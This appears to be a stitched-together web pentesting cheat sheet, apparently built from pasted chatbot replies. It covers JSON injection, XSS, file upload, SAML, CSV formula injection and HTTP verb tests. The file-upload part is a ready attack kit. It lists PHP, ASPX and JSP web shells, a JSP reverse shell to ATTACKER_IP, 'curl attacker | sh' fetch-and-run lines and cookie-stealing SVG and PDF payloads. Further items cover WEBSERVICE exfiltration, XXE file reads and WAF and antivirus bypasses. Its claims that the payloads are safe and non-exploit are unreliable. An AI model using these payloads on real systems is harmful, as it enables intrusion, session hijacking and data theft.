### **15. Big JSON Payload / DoS**

31. Oversized JSON Payload
32. Large Recursive/Repeated Structure

---
Below is a **safe, professional, and non-destructive** list of **JSON-related security test cases** for legitimate penetration testing.
All payloads are **sanitized**, **generic**, and **designed for authorized testing** only.

If you want, I can later provide **step-by-step execution**, **bypass variants**, **Postman-ready collections**, or **burp snippets**.

---

# ✅ **Complete JSON Security Test Cases + Safe Testing Payloads**

---

# **1. JSON Injection (General)**

**Goal:** Inject arbitrary JSON keys/values to alter logic.

### **Testcase Name:** JSON Key/Value Injection

**Payload:**

```json
{
  "role": "user",
  "role_admin": true
}
```

### **Testcase Name:** Boolean Override

**Payload:**

```json
{
  "active": true,
  "bypass": true
}
```

---

# **2. Authentication Bypass (JSON Body Manipulation)**

### **Testcase:** Remove Auth Fields

**Payload:**

```json
{
  "username": "test"
}
```

### **Testcase:** Null Auth Fields

**Payload:**

```json
{
  "username": "admin",
  "password": null
}
```

### **Testcase:** Empty Structures

**Payload:**

```json
{}
```

---

# **3. JSON Parameter Pollution (JPP)**

### **Testcase:** Duplicate Keys

**Payload:**

```json
{
  "role": "user",
  "role": "admin"
}
```

### **Testcase:** Nested Pollution

**Payload:**

```json
{
  "user": {
    "id": 1
  },
  "user": {
    "role": "admin"
  }
}
```

---

# **4. Type Confusion Attacks**

### **Testcase:** String → Array

**Payload:**

```json
{
  "id": ["1"]
}
```

### **Testcase:** Integer → Object

**Payload:**

```json
{
  "id": {
    "bypass": true
  }
}
```

### **Testcase:** Boolean → String

**Payload:**

```json
{
  "active": "false"
}
```

---

# **5. JSON Injection via Special Characters**

### **Testcase:** Escape/Break JSON Parser

**Payload:**

```json
{
  "input": "\"}}]}]}--"
}
```

### **Testcase:** Unicode Bypass

**Payload:**

```json
{
  "username": "admin\u0000"
}
```

---

# **6. Mass Assignment / Overposting**

### **Testcase:** Unauthorized Sensitive Fields

**Payload:**

```json
{
  "username": "test",
  "is_admin": true,
  "credit_limit": 999999
}
```

### **Testcase:** Hidden/Internal Parameters

**Payload:**

```json
{
  "tier": "enterprise",
  "stripe_customer_id": "cus_123",
  "internal_flag": true
}
```

---

# **7. JSON Schema Bypass**

### **Testcase:** Extra random fields

**Payload:**

```json
{
  "name": "test",
  "randomField": "value"
}
```

### **Testcase:** Remove required field

**Payload:**

```json
{
  "email": "attacker@test.com"
}
```

---

# **8. JSON Web Token (JWT) in JSON Bodies**

### **Testcase:** Algorithm Confusion

**Payload:**

```json
{
  "token": "header.eyJhbGciOiJub25lIn0.signature"
}
```

### **Testcase:** Fake Claims

**Payload:**

```json
{
  "token": "eyJ1c2VyIjoicm9vdCIsImFkbWluIjp0cnVlfQ.fake.fake"
}
```

---

# **9. Server-Side JSON Injection → SSRF**

### **Testcase:** URL fields manipulating backend

**Payload:**

```json
{
  "callback_url": "http://127.0.0.1:80/"
}
```

### **Testcase:** DNS exfil mock

**Payload:**

```json
{
  "url": "http://test.burpcollaborator.net"
}
```

---

# **10. JSON Insecure Deserialization**

### **Testcase:** Suspicious Objects

**Payload:**

```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```

### **Testcase:** Constructor Pollution

**Payload:**

```json
{
  "constructor": {
    "prototype": {
      "admin": true
    }
  }
}
```

---

# **11. JSON → XSS (Client-Side Rendering Attacks)**

### **Payload:**

```json
{
  "comment": "<img src=x onerror=alert(1)>"
}
```

### **Payload:** SVG payload

```json
{
  "payload": "<svg/onload=alert(1)>"
}
```

---

# **12. JSONB / PostgreSQL Injection**

### **Payload:**

```json
{
  "filter": "1') || ('1'='1"
}
```

---

# **13. NoSQL (MongoDB) Injection via JSON**

### **Testcase:** Operators

**Payload:**

```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

### **Testcase:** $regex

**Payload:**

```json
{
  "username": {"$regex": ".*"}
}
```

---

# **14. JSONPath Injection**

**Payload:**

```json
{
  "path": "$..*"
}
```

---

# **15. Big JSON Payload / DoS Test**

### **Payload:**

```json
{
  "big": "A".repeat(5000000)
}
```

---

Injecting unsanitized values into backend JSON streams.

```json
{ "username": "\"admin\"" }
```

✅ Expected: Escaped and validated  
❌ Vulnerable: Breaks JSON structure, alters logic

---

### 🧬 **2. JSON Structure Manipulation**  
Injecting nested or malformed structures.

```json
{ "user": { "role": "admin" } }  
{ "user": ["admin", "user"] }
```

✅ Expected: Strict schema enforcement  
❌ Vulnerable: Role escalation or logic confusion

---

### 🧩 **3. Key Injection / Overwrite**  
Injecting duplicate or unexpected keys.

```json
{ "user": "guest", "user": "admin" }
```

✅ Expected: Key deduplication or rejection  
❌ Vulnerable: Overwrites original value

---

### 🧨 **4. JSON Injection Leading to XSS (Client-Side)**  
Injecting script into JSON that gets rendered in DOM.

```json
{ "comment": "<img src=x onerror=alert(1)>" }
```

✅ Expected: Escaped before rendering  
❌ Vulnerable: DOM-based XSS triggered

---

### 🔥 **5. JSON Eval Abuse (JS Context)**  
Breaking out of JS string and injecting script.

```json
{ "name": "\"; alert(1)//" }
```

✅ Expected: Parsed safely  
❌ Vulnerable: XSS via `eval()` or `new Function()`

---

### 🧠 **6. JSONP Callback Injection**  
Injecting into callback parameter of JSONP endpoint.

```http
GET /data?callback=alert(1)
```

✅ Expected: Callback name validated  
❌ Vulnerable: Reflected XSS via JSONP

---

### 🧼 **7. Content-Type Mismatch Exploitation**  
Server returns JSON with `text/html` or `text/plain`.

```http
Content-Type: text/html  
Response: { "msg": "<script>alert(1)</script>" }
```

✅ Expected: `application/json` + `X-Content-Type-Options: nosniff`  
❌ Vulnerable: Browser executes script

---

### 🧬 **8. JSON Injection via Arrays / Type Confusion**

```json
{ "user": ["<script>alert(1)</script>"] }  
{ "user": { "$ne": "" } }
```

✅ Expected: Type validation  
❌ Vulnerable: Logic bypass or XSS via rendering

---

### 🧪 **9. JSON Injection via API Parameters**

```http
POST /api/update  
Content-Type: application/json  
{ "username": "<svg onload=alert(1)>" }
```

✅ Expected: Sanitized before DOM insertion  
❌ Vulnerable: Reflected/stored XSS

---

### 🧩 **10. JSON Injection via Nested Object Reflection**

```json
{ "profile": { "bio": "<script>alert('XSS')</script>" } }
```

✅ Expected: Escaped before rendering  
❌ Vulnerable: Stored XSS in profile page

---

### 🧪 **Fuzzable Parameters for JSON Injection**

```text
username, comment, bio, message, data, payload, input, value, query, search, callback, name, title, description, content, user, role, id, token
```

---
Great point, Anvesh — when the response `Content-Type` is `application/json`, browsers generally treat it as raw data and won’t automatically execute embedded HTML/JS like they would in `text/html`. However, **XSS is still possible in specific contexts**, especially when:

---

### 🚨 JSON XSS Execution Scenarios

**1. JSON Parsed + Injected into DOM (Client-Side Sink)**  
If the response is read via JavaScript and inserted unsafely using sinks like `innerHTML`, `document.write()`, or jQuery `.html()`:

```js
fetch('/api/user')
  .then(res => res.json())
  .then(data => {
    document.body.innerHTML = data.username; // BAD
  });
```

- **Payload:** `{"username":"<img src=x onerror=alert(1)>"}`
- ✅ Expected: Escape before rendering  
- ❌ Vulnerable: Payload executes as HTML

---

**2. Eval/Function-Based Parsing**  
If the JSON is parsed and executed via `eval()` or `new Function()`, even though it's JSON:

```js
eval(res.body);  // Dangerous
new Function(`return ${res.body}`)(); // Also dangerous
```

- **Payload:** `{"name":"\"};alert(1)//"}`
- ✅ Expected: Safe parsing with `JSON.parse()`  
- ❌ Vulnerable: XSS triggered via JS interpreter

---

**3. JSONP Misuse or Open Callback Reflection**  
If endpoint like `/data?callback=` reflects untrusted callback input:

```http
GET /data?callback=alert  
→ Response: `alert({"user":"xss"})`
```

- ✅ Expected: Callback name validated  
- ❌ Vulnerable: Executable XSS payload

---

**4. JSON Served with Unsafe Headers**  
If JSON is served with incorrect or missing headers:

```http
Content-Type: text/html
X-Content-Type-Options: missing
```

- ✅ Expected: `application/json` with `nosniff`  
- ❌ Vulnerable: Browser may render as HTML

---
# **1. List of Vulnerabilities**

```
1.1 Unrestricted File Upload
1.2 MIME-Type Bypass
1.3 Content-Type Header Forgery
1.4 File Extension Bypass
1.5 Double Extension Upload
1.6 Null Byte Injection
1.7 Polyglot File Upload (Image + Script)
1.8 SVG XSS Payload Upload
1.9 Uploading .htaccess for PHP Execution
1.10 Upload Path Traversal (../)
1.11 Client-Side Validation Bypass
1.12 Server-Side Weak Validation
1.13 ImageMagic / EXIF Injection (ImageTragick)
1.14 Remote Code Execution via File Upload
1.15 File Upload → SSRF / LFI / RCE Chains
```

---

# **2. Sample Payloads (Core Attack Payloads)**

*(Normal Structured Payload List)*

```
2.1 Simple Web Shell Upload
<?php system($_GET['cmd']); ?>
```

```
2.2 Double Extension File
shell.php.jpg
```

```
2.3 Fake MIME Type Header
Content-Type: image/jpeg
```

```
2.4 Null Byte Injection (Legacy PHP)
shell.php%00.jpg
```

```
2.5 Polyglot Image + PHP
GIF89a;
<?php echo shell_exec($_GET['cmd']); ?>
```

```
2.6 Malicious SVG Upload (XSS)
<svg><script>alert(1)</script></svg>
```

```
2.7 .htaccess to Force PHP Execution
AddType application/x-httpd-php .jpg
```

```
2.8 Upload Path Traversal
../../../../tmp/shell.php
```

```
2.9 Malicious EXIF Injection
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
```

```
2.10 ImageMagick Exploit (ImageTragick)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/payload")'
```

---

# **3. Sample Payloads (Updated With Real Offensive Payloads)**

*(Real-world exploitation payloads used in RCE cases)*

```
3.1 PHP One-Liner Shell
<?=`$_GET[0]`?>
```

```
3.2 ASPX Web Shell
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])); %>
```

```
3.3 JSP Reverse Shell
<%@ page import="java.io.*"%><%Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");%>
```

```
3.4 WAR Upload (Tomcat)
[WAR archive containing malicious JSP]
```

```
3.5 PHP File Hidden in JPEG (Polyglot)
ÿØÿà<?php echo shell_exec($_GET['cmd']); ?>
```

```
3.6 SVG with External Entity (SVG XXE)
<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>
```

```
3.7 Malicious PDF Payload (JS Auto-Exec)
<< /OpenAction << /JS (app.alert('Pwned')) >> >>
```

```
3.8 Windows Executable Upload (Phishing Dropper)
payload.exe
```

```
3.9 Node.js RCE via Uploaded .js Script
require('child_process').exec('curl http://attacker/a.sh | sh')
```

```
3.10 Python Script Upload → Cronjob Hijack
os.system("curl attacker/pwn | bash")
```

---

# **4. Bypass Techniques (Filters, WAF, Antivirus, MIME Checks)**

*(Same style as Host Header / Prototype Pollution bypass sections)*

```
4.1 Double Extension Bypass
pwn.php.gif
```

```
4.2 Triple Extension Bypass
pwn.php.jpg.png
```

```
4.3 Full Null Byte Injection
pwn.php%00.png
```

```
4.4 Upper/Lower Case Extension Bypass
SHELL.PhP
```

```
4.5 UTF-8 Normalization Bypass
pwn.p%CC%88hp
```

```
4.6 Spoof Content-Type
Content-Type: image/png
```

```
4.7 Chunked Transfer-Encoding Bypass
Transfer-Encoding: chunked
```

```
4.8 Polyglot (PDF + JS + Image)
%PDF-1.3
<js_code_here>
```

```
4.9 Magic Bytes Bypass (Fake Header)
FF D8 FF E0 (JPEG) + <?php ... ?>
```

```
4.10 SVG as Image / Script Combo
<svg/onload=alert(1)>
```

```
4.11 Base64 Encoded Upload
data:image/png;base64,PD9waHAgc3lzdGVtKCRfR0VUWydj...
```

```
4.12 GZIP Compressed Upload
(file.gz containing PHP)
```

```
4.13 HTAccess MIME Force Execution
AddHandler application/x-httpd-php .jpg
```

```
4.14 File Name Obfuscation
....////shell.php
```

```
4.15 Multi-part Boundary Manipulation
------AaB03x
Content-Disposition: form-data; filename="pwn.php"
```

```
4.16 Oversized Boundary (WAF Bypass)
------verylongboundarystring123...
```

```
4.17 Browser-based Client Validation Bypass
Disable JS, upload shell.php
```

```
4.18 Parameter Pollution
file=shell.php&file=.jpg
```

---

# **5. Advanced Attack Chains (Upload → Full Compromise)**

```
5.1 File Upload → Web Shell → RCE
Upload: shell.php
Execute: /uploads/shell.php?cmd=id
```

```
5.2 SVG Upload → Stored XSS → Session Hijack
<svg><script>document.location='//attacker/cookie?c='+document.cookie</script></svg>
```

```
5.3 PDF Upload → JS Execution → Credential Theft
/OpenAction << /JS (fetch('https://x/pwn?c='+document.cookie)) >>
```

```
5.4 File Upload → SSRF via Image Parsing
push graphic-context
fill 'url(http://127.0.0.1:8080/admin)'
```

```
5.5 File Upload → Path Traversal → Config Overwrite
filename="../../../../config.php"
```

```
5.6 File Upload → Zip Slip → RCE
evil.zip
 ├── ../../../../var/www/html/shell.php
```

```
5.7 Upload Malware → AV Bypass → Persistence
payload.exe masked as invoice.png
```

# SAML Injection

> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication and authorization data between parties, in particular, between an identity provider and a service provider. While SAML is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation or misconfiguration can expose systems to various vulnerabilities.

please refer - https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/SAML%20Injection.md?plain=1
## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Invalid Signature](#invalid-signature)
    * [Signature Stripping](#signature-stripping)
    * [XML Signature Wrapping Attacks](#xml-signature-wrapping-attacks)
    * [XML Comment Handling](#xml-comment-handling)
    * [XML External Entity](#xml-external-entity)
    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)
* [References](#references)

Below is a **safe, defensive, and complete penetration-testing style test case** for **SAML Injection**, including **bypass techniques**, presented in the SAME FORMAT as your Host Header test case:

⚠️ *All payloads are provided for **defensive security testing**, awareness, and validation only — not for exploitation.*

# ✅ **SAML Injection – Complete Test Case (with Bypass Techniques)**

These are the major issues an application may expose if SAML assertions are not validated securely:

1 **Signature Wrapping (XSW)** – Attacker injects malicious unsigned elements while tricking the parser into validating the wrong Assertion. 

2 **SAML Response Manipulation** – Modification of email, userID, roles, groups, or audience restrictions inside the SAML response

3 **Assertion Replay** – Reusing a previously valid SAML response to reauthenticate without credentials.

4 **Algorithm Substitution** – Forcing weak or null signature algorithms (e.g., `None`, `MD5`) to bypass verification.

5 **SAML Parameter Injection** – Injecting malicious XML into Base64-decoded SAML fields (e.g., NameID, Attributes).

6 **Open Redirect via RelayState** – Manipulating `RelayState` or `AssertionConsumerServiceURL` to redirect users to attacker-controlled URLs. 

7 **XML External Entity (XXE)** – Exploiting SAML parser that processes external entities to read files or perform SSRF.

8 **Signature Validation Bypass** – Tricking the app into validating the wrong XML element or ignoring unsigned Assertions.

9 **Audience Restriction Bypass** – Altering `<Audience>` to impersonate another app or tenant. 

10 **Privilege Escalation** – Changing `Role`, `Group`, or `NameID` to escalate privileges (e.g., making attacker an admin). 


# **2. Sample Payloads (Safe & Defensive)**

These show *where* injection or tampering occurs for testing. They are **non-exploit payloads**.

---

# 📌 **2.1 Basic SAML Value Tampering Test**

Modify inside `<NameID>`:

```xml
<NameID>admin@example.com</NameID>
```

Role escalation example:

```xml
<Attribute Name="role">
   <AttributeValue>admin</AttributeValue>
</Attribute>
```

---

# 📌 **2.2 Injecting XML into Attributes (SAML Injection)**

```xml
<Attribute Name="username">
   <AttributeValue">test"><Injected>VALUE</Injected></AttributeValue>
</Attribute>
```

```xml
<NameID>user@example.com<test>123</test></NameID>
```

---

# 📌 **2.3 RelayState Manipulation (Redirect Injection)**

```
RelayState=https://evil.com
```

```
RelayState=javascript:alert(1)
```

---

# 📌 **2.4 XSW (XML Signature Wrapping) Template**

This tests whether the system validates **the correct signed element**.

### Attacker's unsigned assertion:

```xml
<Assertion>
  <Subject>
     <NameID>admin@example.com</NameID>
  </Subject>
</Assertion>
```

### Signed but unused assertion:

```xml
<SignedAssertion>
   <Subject>
      <NameID>original-user@example.com</NameID>
   </Subject>
</SignedAssertion>
```

---

# 📌 **2.5 Replay Attack Test**

Reuse same SAMLResponse twice:

```
POST /acs
SAMLResponse=BASE64_VALUE
```

Check if server blocks replay.

---

# 📌 **2.6 Algorithm Substitution Test (Safe)**

```xml
<SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-md5" />
```

```xml
<SignatureMethod Algorithm="none" />
```

---

# 📌 **2.7 Audience Restriction Test**

```xml
<Audience>evil-app.example</Audience>
```

Check if app verifies intended audience.

---

# 📌 **2.8 XXE Test (Safe Non-execution Form)**

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>
```

(App should block external entity resolution.)

---

# **3. Bypass Techniques (Defensive Awareness Only)**

These are **evasion patterns** used to bypass weak SAML validation. For defensive testing only.

---

# 🔥 **3.1 Signature Wrapping Bypass Patterns**

### Duplicate Assertions

```xml
<Assertion ID="signed">
   ... legitimate signed content ...
</Assertion>

<Assertion>
   <Subject><NameID>admin@example.com</NameID></Subject>
</Assertion>
```

Server must reject unsigned secondary assertion.

---

# 🔥 **3.2 Namespace Confusion Bypass**

```xml
<ds:Signature>
<dsig:Signature>
```

Apps with weak namespace validation may fail.

---

# 🔥 **3.3 Whitespace & Formatting Bypass**

```xml
<NameID>admin@example.com     </NameID>
```

```xml
<NameID>
admin@example.com
</NameID>
```

Some apps incorrectly trim or ignore whitespace.

---

# 🔥 **3.4 Encoded / Obfuscated Injection Bypass**

### UTF-16 Base64 SAML:

Encode SAML in UTF-16 → Base64 → test if parser misbehaves.

### HTML Entity Obfuscation:

```xml
<NameID>&#97;dmin@example.com</NameID>
```

### Mixed encoding in attributes:

```xml
<Attribute Name="role">&#x61;dmin</Attribute>
```

---

# 🔥 **3.5 Double Base64 Encoding Bypass**

Test:

* Base64 decoded once
* Base64 decoded twice

Improper decoders fail.

---

# 🔥 **3.6 Invalid / Missing Signature Bypass**

```xml
<Signature></Signature>
```

```xml
<SignatureValue></SignatureValue>
```

System should still reject.

---

# 🔥 **3.7 Fake KeyInfo Attack**

```xml
<KeyInfo>
   <KeyValue>FakePublicKeyHere</KeyValue>
</KeyInfo>
```

Weak validators mistakenly validate using provided key.

---

# 🔥 **3.8 Audience Restriction Bypass**

Alternate hostnames:

```
Audience: target.com.attacker.com
Audience: https://target.com.evil.io
Audience: target.com/
Audience: target.com.#evil
```

---

# 🔥 **3.9 Clock Skew Abuse (Timing Bypass)**

Set timestamps far into past or future:

```xml
<Conditions NotBefore="1900-01-01" NotOnOrAfter="2999-12-31">
```

Application must verify clock window.

---

# ✔ **4. Combined Master Fuzzer Template**

This is a **defensive combined test payload** to detect SAML parsing weaknesses:

```xml
<Response>
  <Assertion>
    <Subject><NameID>admin@example.com</NameID></Subject>
  </Assertion>

  <Assertion ID="signed">
     <Subject><NameID>user@example.com</NameID></Subject>
  </Assertion>

  <!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]>
  <Attribute><AttributeValue>&xxe;</AttributeValue></Attribute>

  <SignatureMethod Algorithm="none" />
  <Audience>evil-app.example</Audience>
</Response>
```

---
Here are **ONLY the testcase names** for **CSV Injection**, nothing else — no payloads.

---

# ✅ **CSV Injection Testcase Names (Names Only)**

1. CSV Formula Injection – Basic
2. Command Execution via CSV Formula
3. Malicious URL Formula Injection
4. Data Exfiltration via WEBSERVICE Formula
5. External URL Redirect using HYPERLINK
6. Auto-Trigger Payload using "@"
7. Formula Injection using "+"
8. Formula Injection using "-"
9. Formula Injection using "="
10. Tab-Prefixed Formula Injection
11. CSV Cell Breakout (Quoted Formula Injection)
12. Chained Formula Injection
13. Base64 Encoded Formula Injection
14. INDIRECT Formula Abuse
15. CHAR() Obfuscation Payload Injection

Here is the **same format** as before —
**first the testcase name**, and **immediately after that the safe CSV-Injection payload**.

---

# ✅ **CSV Injection Testcases + Safe Testing Payloads**

---

### **1. CSV Formula Injection – Basic Payload**

**Payload:**

```
=1+1
```

---

### **2. CSV Injection – Command Execution Formula**

**Payload:**

```
=cmd|' /C calc'!A0
```

---

### **3. CSV Injection – Malicious URL Formula**

**Payload:**

```
=HYPERLINK("http://attacker.com","Click")
```

---

### **4. CSV Injection – Data Exfiltration via WEBSERVICE**

**Payload:**

```
=WEBSERVICE("http://attacker.com/p?x="&A1)
```

---

### **5. CSV Injection – Redirect to External URL**

**Payload:**

```
=HYPERLINK("http://malicious.com")
```

---

### **6. CSV Injection – Auto-Trigger Payload Using @ Symbol**

**Payload:**

```
@SUM(1,2)
```

---

### **7. CSV Injection – Payload Using Plus Symbol**

**Payload:**

```
+SUM(5,5)
```

---

### **8. CSV Injection – Payload Using Minus Symbol**

**Payload:**

```
-SUM(10,10)
```

---

### **9. CSV Injection – Payload Using Equals Symbol**

**Payload:**

```
=SUM(9,9)
```

---

### **10. CSV Injection – Payload Using Tab Leading Character**

**Payload:**

```
\t=1+2
```

*(The tab bypasses some filters.)*

---

### **11. CSV Injection – CSV Cell Breakout**

**Payload:**

```
"=HYPERLINK(""http://evil.com"")"
```

---

### **12. CSV Injection – Chained Formula Payload**

**Payload:**

```
=1+1;WEBSERVICE("http://attacker.com")
```

---

### **13. CSV Injection – Base64 Encoded Formula**

**Payload:**

```
=BASE64DECODE("PT1TVU0oMSwyKQ==")
```

---

### **14. CSV Injection – INDIRECT Formula Abuse**

**Payload:**

```
=INDIRECT("A1")
```

---

### **15. CSV Injection – CHAR() Obfuscation Bypass**

**Payload:**

```
=CHAR(72)&CHAR(84)&CHAR(84)&CHAR(80)
```

Understood — here are **HTTP Verb testcases with *realistic, real-world, but safe*** payloads that actually simulate *valid API actions*, not dummy placeholders.

These payloads look like **real application traffic** (user update, password change, admin actions, etc.) but remain **non-malicious and safe for authorized pentesting**.

---

# ✅ **HTTP Verb Testcases + Realistic Payloads**

Here are **ONLY the testcase names** for **HTTP Verbs**, clean list, no payloads:

---

# ✅ **HTTP Verb Testcase Names (Names Only)**

1. GET Method Access Control Test
2. POST Method Access Control Test
3. PUT Method Access Control Test
4. DELETE Method Access Control Test
5. PATCH Method Access Control Test
6. HEAD Method Access Control Test
7. OPTIONS Method Exposure Test
8. TRACE Method Enabled Test
9. TRACK Method Enabled Test
10. CONNECT Method Enabled Test
11. X-HTTP-Method Override Test
12. X-HTTP-Method-Override Header Test
13. Method Spoofing via Query Parameter
14. Method Spoofing via Hidden Form Field
15. HTTP Verb Fuzzing (Custom Methods)
16. Privilege Escalation via Unsupported Methods
17. CORS Preflight Method Validation
18. Rate Limiting Test Per HTTP Verb
19. CSRF Validation per HTTP Verb
20. API Endpoint Method Fuzzing

---

### **1. GET Method Access Control Test**

**Real Payload:**

```
GET /api/v1/users/1245/profile HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **2. POST Method Access Control Test**

**Real Payload:**

```
POST /api/v1/orders HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer guest-token-123

{
  "product_id": 8891,
  "quantity": 2,
  "address": "Bangalore, India"
}
```

---

### **3. PUT Method Access Control Test**

**Real Payload:**

```
PUT /api/v1/users/1245 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user-token-123

{
  "email": "updated_email@test.com",
  "mobile": "+918885556666"
}
```

---

### **4. DELETE Method Access Control Test**

**Real Payload:**

```
DELETE /api/v1/users/1245 HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

*(Checks if low-privilege token can delete accounts.)*

---

### **5. PATCH Method Access Control Test**

**Real Payload:**

```
PATCH /api/v1/users/1245 HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer user-token-123

{
  "role": "admin"
}
```

*(Privilege-escalation scenario.)*

---

### **6. HEAD Method Access Control Test**

**Real Payload:**

```
HEAD /api/v1/invoices/9958 HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **7. OPTIONS Method Exposure Test**

**Real Payload:**

```
OPTIONS /api/v1/users HTTP/1.1
Host: target.com
Origin: https://example.com
```

---

### **8. TRACE Method Enabled Test**

**Real Payload:**

```
TRACE /api/v1/auth/login HTTP/1.1
Host: target.com
```

---

### **9. TRACK Method Enabled Test**

**Real Payload:**

```
TRACK /api/v1/payments HTTP/1.1
Host: target.com
```

---

### **10. CONNECT Method Enabled Test**

**Real Payload:**

```
CONNECT internal.target.com:443 HTTP/1.1
Host: internal.target.com
```

---

### **11. Method Override Test (X-HTTP-Method)**

**Real Payload:**

```
POST /api/v1/users/9401 HTTP/1.1
Host: target.com
X-HTTP-Method: DELETE
Authorization: Bearer guest-token-123
```

---

### **12. X-HTTP-Method-Override Test**

**Real Payload:**

```
POST /api/v1/users/9401 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT
Content-Type: application/json
Authorization: Bearer guest-token-123

{
  "account_status": "disabled"
}
```

---

### **13. Method Spoofing via Query Param**

**Real Payload:**

```
POST /api/v1/users/9401?_method=DELETE HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **14. Method Spoofing via Hidden Field**

**Real Payload:**

```
POST /api/v1/users/update HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer user-token-123

_method=PATCH&email=hacker@test.com
```

---

### **15. Custom Verb Fuzzing via Burp Repeater**

**Real Payload:**

```
MOVE /api/v1/admin/settings HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **16. Privilege Escalation via Unsupported HTTP Methods**

**Real Payload:**

```
PROPFIND /api/v1/admin/users HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---

### **17. CORS Preflight With Dangerous Verb**

**Real Payload:**

```
OPTIONS /api/v1/password/reset HTTP/1.1
Host: target.com
Origin: https://attacker.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Authorization
```

---

### **18. Rate Limiting Per Verb Test**

**Real Payload (repeat 50–100 times):**

```
PUT /api/v1/auth/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"wrongpass"}
```

---

### **19. CSRF Check for PUT/PATCH/DELETE**

**Real Payload:**

```
PUT /api/v1/user/settings HTTP/1.1
Host: target.com
Content-Type: application/json

{"two_factor_enabled": false}
```

*(Sent without CSRF token.)*

---

### **20. API Verb Fuzzing (Unsupported Verbs Test)**

**Real Payload:**

```
UNLOCK /api/v1/admin/panel HTTP/1.1
Host: target.com
Authorization: Bearer guest-token-123
```

---
